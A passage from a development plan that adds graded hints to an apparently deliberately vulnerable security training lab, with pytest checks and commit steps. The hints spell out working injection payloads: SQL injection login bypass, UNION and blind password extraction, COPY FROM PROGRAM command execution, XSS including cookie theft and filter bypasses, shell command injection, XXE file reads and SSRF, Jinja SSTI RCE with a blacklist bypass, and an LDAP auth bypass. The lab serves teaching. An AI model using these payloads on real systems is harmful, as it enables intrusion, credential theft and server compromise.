                    "The query looks roughly like: SELECT * FROM injection_accounts WHERE username = '<your username>' AND password = '<your password>'. A single quote in your input breaks out of that string literal early.",
                    "Log in with username admin'-- and any password (or leave the password field blank) — the -- comments out the rest of the query, including the password check, logging you in as admin without ever knowing the real password.",
                ],
            ),
```

Find:
```python
            ExampleNav(
                id="union-exfiltration",
                title="UNION-Based SQL Injection Data Exfiltration",
                group="SQL Injection",
                difficulty="Medium",
                endpoint="a03_injection.search",
            ),
```
Replace with:
```python
            ExampleNav(
                id="union-exfiltration",
                title="UNION-Based SQL Injection Data Exfiltration",
                group="SQL Injection",
                difficulty="Medium",
                endpoint="a03_injection.search",
                hints=[
                    "This search box also builds SQL by directly inserting your search term. Once you've broken out of the surrounding string literal, is there a SQL keyword that lets you attach results from a completely different query?",
                    "The underlying query always returns exactly two columns (id, username). UNION SELECT lets you attach a second SELECT with the same column count and shape, pulling rows from any table the database can see.",
                    "First confirm the injection point: search for a lone single quote and check for a database error.",
                    "Then search for: ' UNION SELECT id, value FROM a03_secrets -- — the results table now shows rows from a03_secrets, a table this search box was never meant to expose. The same technique reaches injection_accounts itself for real usernames and passwords.",
                ],
            ),
```

Find:
```python
            ExampleNav(
                id="roster-sort",
                title="Employee Roster Sort (ORDER BY Injection)",
                group="SQL Injection",
                difficulty="Medium",
                endpoint="a03_injection.roster",
            ),
```
Replace with:
```python
            ExampleNav(
                id="roster-sort",
                title="Employee Roster Sort (ORDER BY Injection)",
                group="SQL Injection",
                difficulty="Medium",
                endpoint="a03_injection.roster",
                hints=[
                    "The employee roster can be sorted by column, and the column name comes straight from a URL parameter. ORDER BY targets are trickier to inject than a normal WHERE-clause value — think about why the usual quote-breakout trick doesn't directly apply here.",
                    "Since the sort value is inserted as a raw SQL expression rather than a quoted string, you don't need to break out of anything — any valid SQL expression can go there directly, as long as it's legal in an ORDER BY position.",
                    "Try ?sort=(CASE WHEN (1=1) THEN name ELSE email END) — a full conditional expression works fine as a sort target, proving arbitrary SQL executes there, not just a bare column name.",
                    "For real information disclosure, make the CASE condition depend on hidden data, e.g. (CASE WHEN (some condition about a secret) THEN name ELSE id END) — the resulting row order changes depending on whether the condition is true, letting you extract data one true/false answer at a time through the sort order instead of a WHERE clause.",
                ],
            ),
```

Find:
```python
            ExampleNav(
                id="blind-sqli",
                title="Blind Time-Based SQL Injection",
                group="SQL Injection",
                difficulty="Hard",
                endpoint="a03_injection.check_username",
            ),
```
Replace with:
```python
            ExampleNav(
                id="blind-sqli",
                title="Blind Time-Based SQL Injection",
                group="SQL Injection",
                difficulty="Hard",
                endpoint="a03_injection.check_username",
                hints=[
                    "This username-availability check never shows you any data — just 'available' or 'taken'. When there's nothing to read directly, what OTHER observable signal could a malicious query still produce?",
                    "PostgreSQL has a function that pauses query execution for a given number of seconds. If that delay is made conditional on something you want to know, the response TIME itself becomes the leaked signal.",
                    "Try: nobody' OR (SELECT 1 FROM pg_sleep(5))=1-- — if the page takes about 5 seconds to respond, you've confirmed both the injection point and the timing side-channel work.",
                    "Wrap the sleep in a conditional instead of an unconditional one: pg_sleep((SELECT CASE WHEN <condition> THEN 5 ELSE 0 END)) — a true condition delays the response, a false one returns immediately.",
                    "Extract data one character at a time by testing conditions like (SELECT substring(password,1,1) FROM injection_accounts WHERE username='admin')='s' inside that CASE — repeat for each position and each candidate character to reconstruct the admin password purely from response timing, with no data ever displayed on the page.",
                ],
            ),
```

Find:
```python
            ExampleNav(
                id="roster-lookup",
                title="Employee Lookup (Numeric Blind Injection)",
                group="SQL Injection",
                difficulty="Hard",
                endpoint="a03_injection.roster_lookup",
            ),
```
Replace with:
```python
            ExampleNav(
                id="roster-lookup",
                title="Employee Lookup (Numeric Blind Injection)",
                group="SQL Injection",
                difficulty="Hard",
                endpoint="a03_injection.roster_lookup",
                hints=[
                    "This lookup takes a numeric employee ID and only ever tells you found or not found. The ID isn't wrapped in quotes anywhere in the query — what does that change about how you'd break out of it?",
                    "Because the value is substituted as a raw number rather than inside a string literal, you don't need a quote to inject at all — any valid SQL expression that evaluates to a number (or a boolean, which SQL treats as 0/1) works directly in its place.",
                    "Try id=0 OR 1=1 — if 'found' flips to true even though employee 0 shouldn't exist, you've confirmed the whole WHERE clause is under your control, not just a literal ID value.",
                    "Turn this into a working oracle: id=0 OR (SELECT CASE WHEN <condition> THEN 1 ELSE 0 END)=1 — 'found' becomes true exactly when <condition> is true, a boolean-blind read with no timing required.",
                    "Substitute a real condition, e.g. id=0 OR (SELECT CASE WHEN (SELECT substring(password,1,1) FROM injection_accounts WHERE username='admin')='s' THEN 1 ELSE 0 END)=1 — repeat per character and position to extract the admin password one true/false answer at a time, purely from the found/not-found flag.",
                ],
            ),
```

Find:
```python
            ExampleNav(
                id="error-based-sqli",
                title="Error-Based SQL Injection via Product Lookup",
                group="SQL Injection",
                difficulty="Medium",
                endpoint="a03_injection.product_lookup",
            ),
```
Replace with:
```python
            ExampleNav(
                id="error-based-sqli",
                title="Error-Based SQL Injection via Product Lookup",
                group="SQL Injection",
                difficulty="Medium",
                endpoint="a03_injection.product_lookup",
                hints=[
                    "This product lookup takes a raw ID and, unusually, shows you the actual database error message when something goes wrong. What could that error text accidentally reveal?",
                    "Submit a lone single quote as the product ID and look closely at the error that comes back — the database is telling you something about the query it tried to run.",
                    "PostgreSQL raises a type-conversion error if you ask it to CAST a value that isn't a valid integer — and that error message includes the exact value it failed to convert.",
                    "Submit: 1 AND CAST((SELECT password FROM injection_accounts WHERE username='admin') AS int) > 0 — the CAST fails because a real password isn't numeric, and the resulting error message leaks that password's actual text.",
                ],
            ),
```

Find:
```python
            ExampleNav(
                id="sqli-to-rce",
                title="Advanced SQL Injection: From Detection to Remote Code Execution",
                group="SQL Injection",
                difficulty="Hard",
                endpoint="a03_injection.inventory_lookup",
            ),
```
Replace with:
```python
            ExampleNav(
                id="sqli-to-rce",
                title="Advanced SQL Injection: From Detection to Remote Code Execution",
                group="SQL Injection",
                difficulty="Hard",
                endpoint="a03_injection.inventory_lookup",
                hints=[
                    "This inventory check takes a numeric SKU with no quotes involved, the same shape as the roster lookup. But this endpoint's database driver allows something most of the other examples don't — what happens if you put more than one SQL statement in the same input, separated by a semicolon?",
                    "Try id=0 OR 1=1 first to confirm the field reaches raw SQL, exactly like the roster lookup example. Then try appending a second, harmless statement after a semicolon, like 1; SELECT 1-- — if that doesn't error out, stacked multi-statement queries are genuinely accepted here.",
                    "PostgreSQL's COPY ... FROM PROGRAM command lets a sufficiently privileged database role run an arbitrary OS command and write its output into a table — and stacked queries mean you can inject that as a second statement right after your first one.",
                    "A safe way to prove code execution without opening any network connection: 1; DROP TABLE IF EXISTS a03_rce_check; CREATE TABLE a03_rce_check (output text); COPY a03_rce_check FROM PROGRAM 'id'; -- — then look up any SKU again and the database now holds this server's real id command output.",
                    "From there, the same COPY ... TO PROGRAM mechanism can pipe a reverse-shell command instead of a harmless one, turning the injection into a fully interactive shell on the database server — this final escalation step is manual, hands-on-keyboard exploitation only, matching this example's own Exploitation walkthrough (this lab's automated tests never attempt it).",
                ],
            ),
```

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/bin/pytest tests/test_a03_hints_sqli_group.py -v`
Expected: PASS (1 passed)

- [ ] **Step 5: Run the full A03 test suite and the full suite**

Run: `.venv/bin/pytest tests/test_a03_hints_sqli_group.py tests/ -q`
Expected: all pass (442 baseline from Task 3 + 1 new = 443).

- [ ] **Step 6: Commit**

```bash
git add app/categories/a03_injection/__init__.py tests/test_a03_hints_sqli_group.py
git commit -m "feat(scoring): author hints for A03 SQL Injection group

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>"
```

---

## Task 5: A03 Hints — Remaining Groups (12 examples)

**Files:**
- Modify: `app/categories/a03_injection/__init__.py`
- Test: `tests/test_a03_hints_remaining_groups.py`

**Interfaces:**
- Consumes: `ExampleNav.hints` field (Task 1). Touches the same file as
  Task 4 but a disjoint set of `ExampleNav` entries (the XSS, OS Command
  Injection, XXE, SSTI, and LDAP Injection groups) — run after Task 4,
  never in parallel with it.
- Produces: nothing consumed by later tasks.

- [ ] **Step 1: Write the failing shape test**

Create `tests/test_a03_hints_remaining_groups.py`:

```python
from app.core.nav import CATEGORIES

REMAINING_GROUP_IDS = [
    "reflected-xss",
    "stored-xss",
    "filter-challenge",
    "filtered-host-lookup",
    "command-injection",
    "blind-report-injection",
    "xml-import",
    "xxe-ssrf",
    "ssti-email-preview",
    "ssti-blacklist-bypass",
    "ldap-directory-login",
    "ldap-directory-search",
]


def test_a03_remaining_groups_examples_have_well_formed_hint_sequences():
    a03 = next(c for c in CATEGORIES if c.id == "a03_injection")
    examples_by_id = {e.id: e for e in a03.examples}
    for example_id in REMAINING_GROUP_IDS:
        example = examples_by_id[example_id]
        assert 3 <= len(example.hints) <= 5, f"{example.id} has {len(example.hints)} hints"
        assert all(hint.strip() for hint in example.hints), f"{example.id} has an empty hint"
        assert len(set(example.hints)) == len(example.hints), f"{example.id} has duplicate hints"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_a03_hints_remaining_groups.py -v`
Expected: FAIL — every listed example currently has `hints == []`.

- [ ] **Step 3: Add `hints=[...]` to each of these 12 `ExampleNav` entries**

Modify `app/categories/a03_injection/__init__.py`. Find each of the
following 12 `ExampleNav(...)` calls and add a `hints=[...]` argument to
each, immediately after its `endpoint=` line, leaving every other field —
including the 7 `ExampleNav` entries Task 4 already updated — completely
unchanged.

**IMPORTANT — read the "Note on hint text and HTML escaping" section
above Task 2 before writing this task's hints:** several of these hints
quote literal HTML/XML markup (`<script>`, `<img ...>`, `<!DOCTYPE ...>`,
etc.) as part of the payload text. Because hints render through the
autoescaped `{{ hint }}` expression (not a static block), write these
markup characters as PLAIN, unescaped `<`/`>`/`&` in the Python string —
never as `&lt;`/`&gt;`/`&amp;` entities. Jinja's autoescaping handles safe
HTML display automatically; pre-escaping here would double-escape and
show literal `&lt;script&gt;` text on the page instead of the intended
`<script>` in a code-styled context.

Find:
```python
            ExampleNav(
                id="reflected-xss",
                title="Reflected XSS in Greeting Page",
                group="Cross-Site Scripting (XSS)",
                difficulty="Medium",
                endpoint="a03_injection.greet",
            ),
```
Replace with:
```python
            ExampleNav(
                id="reflected-xss",
                title="Reflected XSS in Greeting Page",
                group="Cross-Site Scripting (XSS)",
                difficulty="Medium",
                endpoint="a03_injection.greet",
                hints=[
                    "This page builds a greeting from a URL query parameter and marks the result 'safe' before rendering it — think about what 'safe' means to a template engine, and what that implies about escaping.",
                    "Try putting a harmless HTML tag in the name parameter, like <b>test</b> — if it renders as bold instead of literal text, your input is being interpreted as markup, not escaped.",
                    "Since HTML renders, script tags should too. Submit ?name=<script>alert(document.cookie)</script> as the query string — the script executes immediately when the page loads, no clicking required beyond visiting the crafted URL.",
                ],
            ),
```

Find:
```python
            ExampleNav(
                id="stored-xss",
                title="Stored XSS in Comments",
                group="Cross-Site Scripting (XSS)",
                difficulty="Hard",
                endpoint="a03_injection.comments",
            ),
```
Replace with:
```python
            ExampleNav(
                id="stored-xss",
                title="Stored XSS in Comments",
                group="Cross-Site Scripting (XSS)",
                difficulty="Hard",
                endpoint="a03_injection.comments",
                hints=[
                    "This comment form stores exactly what you type and shows it back to every future visitor — check whether the stored text goes through the same escaping-bypass trick as the reflected XSS example.",
                    "Post a comment with a harmless tag like <b>test</b> in the body. If it renders bold on reload instead of literal text, the stored comment is being rendered unescaped for everyone who views the page, not just you.",
                    "Post a comment with the body <script>alert('stored XSS')</script> — reload the page and the script fires immediately, with no link-clicking or social engineering needed, and it fires again for every future visitor until the lab is reset.",
                ],
            ),
```

Find:
```python
            ExampleNav(
                id="filter-challenge",
                title="Filter Bypass Challenge",
                group="Cross-Site Scripting (XSS)",
                difficulty="Hard",
                endpoint="a03_injection.filter_challenge",
            ),
```
Replace with:
```python
            ExampleNav(
                id="filter-challenge",
                title="Filter Bypass Challenge",
                group="Cross-Site Scripting (XSS)",
                difficulty="Hard",
                endpoint="a03_injection.filter_challenge",
                hints=[
                    "Three separate filters are running here, and each one blocks the 'obvious' script-tag payload in a different way. Look at each filter's actual code — a naive filter's blind spot is usually a case it never considered, not a case it got wrong.",
                    "Level 1 only checks for the literal substring '<script'. Any other tag can carry executable JavaScript too — think about an <img> tag with a broken image source and an event handler.",
                    "Level 1 bypass: submit <img src=x onerror=console.log('LEVEL-1-BYPASS')>. Level 2 strips '<script>' and '</script>' as two separate one-time passes and never re-checks its own output afterward — what happens if you nest one script tag inside another so the stripped-out fragments recombine?",
                    "Level 2 bypass: submit <scr<script>ipt>console.log('LEVEL-2-BYPASS')</scr</script>ipt> — removing the inner tags leaves the outer fragments sitting next to each other, reconstituting a real <script> tag. Level 3 only escapes < and > — but its output is reflected inside an HTML attribute (value=\"...\"), where a bare quote is what actually breaks out, no angle brackets required.",
                    "Level 3 bypass: submit \" autofocus onfocus=\"console.log('LEVEL-3-BYPASS'). The lone double-quote closes the value=\"...\" attribute early; everything after becomes two new attributes on the same tag, and autofocus makes onfocus fire the instant the page loads.",
                ],
            ),
```

Find:
```python
            ExampleNav(
                id="filtered-host-lookup",
                title="Hostname Lookup Filter Bypass",
                group="OS Command Injection",
                difficulty="Medium",
                endpoint="a03_injection.filtered_host_lookup",
            ),
```
Replace with:
```python
            ExampleNav(
                id="filtered-host-lookup",
                title="Hostname Lookup Filter Bypass",
                group="OS Command Injection",
                difficulty="Medium",
                endpoint="a03_injection.filtered_host_lookup",
                hints=[
                    "This version blocks the obvious shell separators before running the command. Think about what OTHER characters a shell treats as a command separator that a blacklist author might forget.",
                    "The filter checks for semicolon, ampersand, and pipe. A literal newline character does the exact same job in /bin/sh — terminates one command and starts the next — and isn't on this list at all.",
                    "The input field is a textarea, so you can type a real newline. Submit localhost on one line and whoami on the next (in the same submission) — the filter lets it through since it never checks for a newline, and whoami's output appears in the response.",
                ],
            ),
```

Find:
```python
            ExampleNav(
                id="command-injection",
                title="OS Command Injection in Host Lookup Tool",
                group="OS Command Injection",
                difficulty="Hard",
                endpoint="a03_injection.host_lookup",
            ),
```
Replace with:
```python
            ExampleNav(
                id="command-injection",
                title="OS Command Injection in Host Lookup Tool",
                group="OS Command Injection",
                difficulty="Hard",
                endpoint="a03_injection.host_lookup",
                hints=[
                    "This 'hostname lookup' tool runs a shell command built directly from your input, with no filtering at all this time. What shell metacharacter lets you chain a second, completely different command onto the first?",
                    "Try appending a semicolon and a second command after a normal-looking hostname — /bin/sh treats everything after the semicolon as a brand-new command.",
                    "Submit localhost; whoami as the hostname — the output includes the result of whoami appended after the lookup, proving you've executed an arbitrary command on the server. $(id) also works via command substitution.",
                    "Once you've proven basic command execution works, this example's own Exploitation section goes further — it walks through escalating this exact injection point into a full interactive reverse shell using nc or bash's /dev/tcp, if you want to take it that far.",
                ],
            ),
```

Find:
```python
            ExampleNav(
                id="blind-report-injection",
                title="Blind Command Injection via Report Generator",
                group="OS Command Injection",
                difficulty="Hard",
                endpoint="a03_injection.generate_report",
            ),
```
Replace with:
```python
            ExampleNav(
                id="blind-report-injection",
                title="Blind Command Injection via Report Generator",
                group="OS Command Injection",
                difficulty="Hard",
                endpoint="a03_injection.generate_report",
                hints=[
                    "This 'generate report' feature never shows you any output — success, failure, or anything else all look identical. When a page gives you zero visible signal, what OTHER property of an HTTP response can still leak information?",
                    "Submit an ordinary report name, then submit one designed to make a shell command pause for several seconds. If the SECOND request visibly takes longer to respond, you've found a timing side-channel with command execution behind it.",
                    "Confirm it: submit x; sleep 5 # as the report name. A ~5-second-slower response (compared to a normal report name) proves your input reaches a real shell — even though the page text itself never changes.",
                    "A timing oracle can answer yes/no questions about data you can't see, one bit at a time. To read the first byte of a secret file on the server, build a conditional sleep shaped like: x; [ $(printf %d \\'$(head -c1 /path/to/file)) -gt 128 ] && sleep 3 # — slow means the byte's value is above 128, instant means it isn't. Binary-search that range (halving each guess) and you'll pin down the exact byte in about 8 requests.",
                    "Doing that one byte at a time for an entire file by hand doesn't scale — this is exactly the kind of blind extraction that tools like commix automate: point it at this endpoint and it recovers a whole file unattended in a couple of minutes, the same technique as the manual binary search, just automated across every byte.",
                ],
            ),
```

Find:
```python
            ExampleNav(
                id="xml-import",
                title="XXE File Disclosure via Contact Import",
                group="XML External Entity Injection (XXE)",
                difficulty="Easy",
                endpoint="a03_injection.xml_import",
            ),
```
Replace with:
```python
            ExampleNav(
                id="xml-import",
                title="XXE File Disclosure via Contact Import",
                group="XML External Entity Injection (XXE)",
                difficulty="Easy",
                endpoint="a03_injection.xml_import",
                hints=[
                    "This 'import a contact' feature parses whatever XML you upload. XML has a mechanism for declaring custom shorthand values ('entities') inside a <!DOCTYPE> block — some of those can point outside the document entirely, at a resource on the server's own filesystem.",
                    "Try declaring an entity whose value is file:///etc/hostname — a file every Linux system has and that's safe to read. If the imported 'name' shows the container's hostname instead of an error, external entity resolution is enabled and file contents are getting substituted into your document.",
                    "Submit this XML as the upload: <?xml version=\"1.0\"?><!DOCTYPE contact [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><contact><name>&xxe;</name></contact> — the response shows the real file contents, since the parser expands your entity before extracting the <name> element's text.",
                ],
            ),
```

Find:
```python
            ExampleNav(
                id="xxe-ssrf",
                title="XXE SSRF via Status Feed Importer",
                group="XML External Entity Injection (XXE)",
                difficulty="Hard",
                endpoint="a03_injection.xxe_ssrf",
            ),
```
Replace with:
```python
            ExampleNav(
                id="xxe-ssrf",
                title="XXE SSRF via Status Feed Importer",
                group="XML External Entity Injection (XXE)",
                difficulty="Hard",
                endpoint="a03_injection.xxe_ssrf",
                hints=[
                    "This 'status feed' importer has the same XML-entity-expansion flaw as the contact importer — but this time, think about what happens if the entity's SYSTEM identifier is a URL instead of a local file path.",
                    "The server has a health-check endpoint at /healthz that only makes sense to call from inside the server's own network. What if you could make the SERVER issue that request FOR you, through the XML parser?",
                    "Declare an entity pointing at http://127.0.0.1:5000/healthz and submit that XML as the status feed. If the response includes the exact body /healthz returns, the server itself just made an outbound HTTP request on your behalf: <!DOCTYPE status [<!ENTITY probe SYSTEM \"http://127.0.0.1:5000/healthz\">]><status><message>&probe;</message></status>",
                    "This is Server-Side Request Forgery reached through an XML parser: in a real deployment, the actual target of interest wouldn't be a harmless health check but an internal-only address like a cloud metadata service (e.g. 169.254.169.254 on AWS/GCP/Azure) — anything the server can reach on its internal network that an external attacker never could directly.",
                ],
            ),
```

Find:
```python
            ExampleNav(
                id="ssti-email-preview",
                title="SSTI RCE via Custom Email Notification Preview",
                group="Server-Side Template Injection (SSTI)",
                difficulty="Easy",
                endpoint="a03_injection.email_preview",
            ),
```
Replace with:
```python
            ExampleNav(
                id="ssti-email-preview",
                title="SSTI RCE via Custom Email Notification Preview",
                group="Server-Side Template Injection (SSTI)",
                difficulty="Easy",
                endpoint="a03_injection.email_preview",
                hints=[
                    "This 'preview my email' feature runs your typed greeting text through Flask's template renderer. Template engines don't just display text — they can evaluate expressions inside it. What syntax does Jinja use for an expression?",
                    "Try submitting {{ 7*7 }} as your greeting text. If the preview shows 49 instead of the literal text {{ 7*7 }}, your input is being evaluated as template code, not displayed as data.",
                    "Jinja templates have access to Python's object internals through attributes like self.__init__.__globals__. Chaining through those eventually reaches __builtins__, and from there __import__.",
                    "Submit this as your greeting text: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }} — the preview shows the real output of the id command, executed on the server itself.",
                ],
            ),
```

Find:
```python
            ExampleNav(
                id="ssti-blacklist-bypass",
                title="SSTI Blacklist Bypass via Profile Bio Preview",
                group="Server-Side Template Injection (SSTI)",
                difficulty="Hard",
                endpoint="a03_injection.bio_preview",
            ),
```
Replace with:
```python
            ExampleNav(
                id="ssti-blacklist-bypass",
                title="SSTI Blacklist Bypass via Profile Bio Preview",
                group="Server-Side Template Injection (SSTI)",
                difficulty="Hard",
                endpoint="a03_injection.bio_preview",
                hints=[
                    "This bio-preview feature has the exact same SSTI bug as the email-preview example, but it now checks your input against a list of forbidden words first. Confirm the underlying template-evaluation bug still exists with a payload that doesn't contain any blocked word at all.",
                    "{{ 7*7 }} contains none of the blocked words and still evaluates — the blacklist only blocks specific keywords, not the ability to run arbitrary template expressions.",
                    "The direct RCE payload from the email-preview example gets blocked because it literally contains the words os, import, and popen. Jinja has a string-concatenation operator, ~, that combines strings AT RENDER TIME, inside the expression itself — meaning the blocked words never appear as literal substrings in what you submit.",
                    "Build each blocked word from smaller pieces using ~, e.g. 'o'~'s' becomes the string \"os\" only once Jinja evaluates it. Submit: {{ self.__init__.__globals__.__builtins__['__imp'~'ort__']('o'~'s').__dict__['pop'~'en']('id').read() }} — the blacklist's substring check passes (none of the forbidden words appear literally), and the exact same command execution as the email-preview example happens.",
                ],
            ),
```

Find:
```python
            ExampleNav(
                id="ldap-directory-login",
                title="LDAP Auth Bypass via Company Directory Login",
                group="LDAP Injection",
                difficulty="Easy",
                endpoint="a03_injection.directory_login",
            ),
```
Replace with:
```python
            ExampleNav(
                id="ldap-directory-login",
                title="LDAP Auth Bypass via Company Directory Login",
                group="LDAP Injection",
                difficulty="Easy",
                endpoint="a03_injection.directory_login",
                hints=[
                    "This login form builds an LDAP search filter directly from your username and password. LDAP filters have their own special characters, just like SQL has quotes — what does a bare asterisk mean inside one?",
                    "In LDAP filter syntax, * means 'any non-empty value', not a literal asterisk. Try logging in as a username you know exists (alice) with * as the password.",
                    "If that logs you in as alice without her real password, the filter is genuinely unescaped. Now aim higher: log in with username root_admin and password * — you're authenticated as the Root Administrator account, whose real password you never supplied, because the filter the server evaluates becomes '(&(uid=root_admin)(userPassword=*))' — match any entry with that uid that has SOME password set, which every real account does.",
                ],
            ),
```

Find:
```python
            ExampleNav(
                id="ldap-directory-search",
                title="Blind LDAP Injection via Employee Directory Search",
                group="LDAP Injection",
                difficulty="Hard",
                endpoint="a03_injection.directory_search",
            ),
```
Replace with:
```python
            ExampleNav(
                id="ldap-directory-search",
                title="Blind LDAP Injection via Employee Directory Search",
                group="LDAP Injection",
                difficulty="Hard",
                endpoint="a03_injection.directory_search",
                hints=[
                    "This directory search never shows you the matched value — only whether a match was found at all. That's a single bit of signal per request, exactly like this lab's blind SQL injection example, just against LDAP instead of SQL.",
                    "The filter matches on the description field as a PREFIX (description=QUERY*). Try target=root_admin with query=r — a 'match found' result tells you root_admin's hidden description starts with the letter r.",
                    "Keep extending the query by one character at a time, trying every letter/digit at each new position — 're' still matches, 'rf' doesn't, so the second character is 'e', and so on. Each correct guess narrows the search by exactly one more confirmed character.",
                    "Repeating this character-by-character process recovers the entire hidden description value (a secret recovery code) purely from found/not-found responses, without the server ever showing you the value directly — slower than a direct leak, but fully automatable exactly like the blind SQLi technique elsewhere in this lab.",
                ],
            ),
```

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/bin/pytest tests/test_a03_hints_remaining_groups.py -v`
Expected: PASS (1 passed)

- [ ] **Step 5: Run the full A03 overview/nav tests and the full suite**

Run: `.venv/bin/pytest tests/test_a03_overview.py tests/test_a03_hints_sqli_group.py tests/test_a03_hints_remaining_groups.py tests/ -q`
Expected: all pass (443 baseline from Task 4 + 1 new = 444). Confirm
`tests/test_a03_overview.py`'s nav-grouping tests still pass unchanged —
this task only adds a `hints=` keyword argument to existing entries, it
never changes `id`/`title`/`group`/`difficulty`/`endpoint` or reorders
anything.

- [ ] **Step 6: Commit**

```bash
git add app/categories/a03_injection/__init__.py tests/test_a03_hints_remaining_groups.py
git commit -m "feat(scoring): author hints for A03's XSS/OS-command/XXE/SSTI/LDAP groups

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>"
```

---

## Task 6: A04 Hints — Insecure Design (3 examples)

**Files:**
- Modify: `app/categories/a04_insecure_design/__init__.py`
- Test: `tests/test_a04_hints.py`

**Interfaces:**
- Consumes: `ExampleNav.hints` field (Task 1).
- Produces: nothing consumed by later tasks.

- [ ] **Step 1: Write the failing shape test**

Create `tests/test_a04_hints.py`:

```python
from app.core.nav import CATEGORIES


def test_a04_examples_have_well_formed_hint_sequences():
    a04 = next(c for c in CATEGORIES if c.id == "a04_insecure_design")
    assert len(a04.examples) == 3
    for example in a04.examples:
        assert 3 <= len(example.hints) <= 5, f"{example.id} has {len(example.hints)} hints"
        assert all(hint.strip() for hint in example.hints), f"{example.id} has an empty hint"
        assert len(set(example.hints)) == len(example.hints), f"{example.id} has duplicate hints"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_a04_hints.py -v`
Expected: FAIL — every example currently has `hints == []`.

- [ ] **Step 3: Add hints to each `ExampleNav`**

Modify `app/categories/a04_insecure_design/__init__.py`. Current file:

```python
from flask import Blueprint

a04_bp = Blueprint(
    "a04_insecure_design", __name__, template_folder="templates", url_prefix="/a04"
)

from app.categories.a04_insecure_design import routes  # noqa: E402,F401
from app.core.nav import CATEGORIES, CategoryNav, ExampleNav  # noqa: E402

CATEGORIES.append(
    CategoryNav(
        id="a04_insecure_design",
        short_id="A04",
        title="Insecure Design",
        blurb="Missing security controls baked into the design itself, not just a coding mistake.",
        blueprint_name="a04_insecure_design",
        overview_endpoint="a04_insecure_design.overview",
        examples=[
            ExampleNav(
                id="unlimited-coupon",
                title="Unlimited Coupon Reuse",
                group="Business Logic Abuse",
                difficulty="Easy",
                endpoint="a04_insecure_design.coupon_cart",
            ),
            ExampleNav(
                id="negative-quantity",
                title="Negative Quantity Price Manipulation",
                group="Business Logic Abuse",
                difficulty="Medium",
                endpoint="a04_insecure_design.quantity_cart",
            ),
            ExampleNav(
                id="checkout-bypass",
                title="Multi-Step Checkout Bypass",
                group="Workflow Bypass",
                difficulty="Hard",
                endpoint="a04_insecure_design.checkout_shipping",
            ),
        ],
    )
)
```

Replace it in full with:

```python
from flask import Blueprint

a04_bp = Blueprint(
    "a04_insecure_design", __name__, template_folder="templates", url_prefix="/a04"
)

from app.categories.a04_insecure_design import routes  # noqa: E402,F401
from app.core.nav import CATEGORIES, CategoryNav, ExampleNav  # noqa: E402

CATEGORIES.append(
    CategoryNav(
        id="a04_insecure_design",
        short_id="A04",
        title="Insecure Design",
        blurb="Missing security controls baked into the design itself, not just a coding mistake.",
        blueprint_name="a04_insecure_design",
        overview_endpoint="a04_insecure_design.overview",
        examples=[
            ExampleNav(
                id="unlimited-coupon",
                title="Unlimited Coupon Reuse",
                group="Business Logic Abuse",
                difficulty="Easy",
                endpoint="a04_insecure_design.coupon_cart",
                hints=[
                    "This coupon form doesn't track whether you already used the code. What happens if you submit the same valid code more than once?",
                    "Every successful submission adds another discount to your session — there's no check for 'already applied' and no maximum number of uses.",
                    "Submit the coupon code WELCOME10 in the form repeatedly (refresh and resubmit, or script multiple POSTs to /a04/coupon-cart with code=WELCOME10) — the discount keeps stacking, eventually pushing the total to $0 or below.",
                ],
            ),
            ExampleNav(
                id="negative-quantity",
                title="Negative Quantity Price Manipulation",
                group="Business Logic Abuse",
                difficulty="Medium",
                endpoint="a04_insecure_design.quantity_cart",
                hints=[
                    "This cart multiplies price by quantity with no bounds check. What normally-invalid quantity might the server accept anyway?",
                    "The server parses your submitted quantity as a plain integer and multiplies it directly into the total — negative numbers pass the int() conversion just fine.",
                    "Submit a negative quantity, e.g. quantity=-5, to /a04/quantity-cart — the total price goes negative, which a real checkout might interpret as money owed TO the customer.",
                ],
            ),
            ExampleNav(
                id="checkout-bypass",
                title="Multi-Step Checkout Bypass",
                group="Workflow Bypass",
                difficulty="Hard",
                endpoint="a04_insecure_design.checkout_shipping",
                hints=[
                    "This checkout has three steps: shipping, payment, confirm. Does the server actually verify you completed steps 1 and 2 before letting you reach step 3?",
                    "The shipping step just records 'shipping done' in your session and is never read again by any later step. The confirm step only checks whether an order ID already exists in your session.",
                    "Visit /a04/checkout/confirm directly, skipping /a04/checkout/shipping and /a04/checkout/payment entirely (clear your session first, or use a fresh browser/incognito window) — the server creates a new 'confirmed' order anyway, marked unpaid, with no verification any prior step occurred.",
                    "This is a workflow-bypass / business-logic flaw: enforcing a UI sequence (multi-page checkout) is not the same as enforcing it server-side. The fix is for the confirm step to verify session state set by the earlier steps rather than trusting that the user simply followed the intended page order.",
                ],
            ),
        ],
    )
)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/bin/pytest tests/test_a04_hints.py -v`
Expected: PASS (1 passed)

- [ ] **Step 5: Run the full test suite**

Run: `.venv/bin/pytest tests/ -q`
Expected: all pass (444 baseline from Task 5 + 1 new = 445).

- [ ] **Step 6: Commit**

```bash
git add app/categories/a04_insecure_design/__init__.py tests/test_a04_hints.py
git commit -m "feat(scoring): author hints for A04 examples

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>"
```

---

## Task 7: A05 Hints — Security Misconfiguration (6 examples)

**Files:**
- Modify: `app/categories/a05_security_misconfiguration/__init__.py`
- Test: `tests/test_a05_hints.py`

**Interfaces:**
- Consumes: `ExampleNav.hints` field (Task 1).
- Produces: nothing consumed by later tasks.

- [ ] **Step 1: Write the failing shape test**

Create `tests/test_a05_hints.py`:

```python
from app.core.nav import CATEGORIES


def test_a05_examples_have_well_formed_hint_sequences():
    a05 = next(c for c in CATEGORIES if c.id == "a05_security_misconfiguration")
    assert len(a05.examples) == 6
    for example in a05.examples:
        assert 3 <= len(example.hints) <= 5, f"{example.id} has {len(example.hints)} hints"
        assert all(hint.strip() for hint in example.hints), f"{example.id} has an empty hint"
        assert len(set(example.hints)) == len(example.hints), f"{example.id} has duplicate hints"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_a05_hints.py -v`
Expected: FAIL — every example currently has `hints == []`.

- [ ] **Step 3: Add hints to each `ExampleNav`**

Modify `app/categories/a05_security_misconfiguration/__init__.py`. Current
file:

```python
from flask import Blueprint

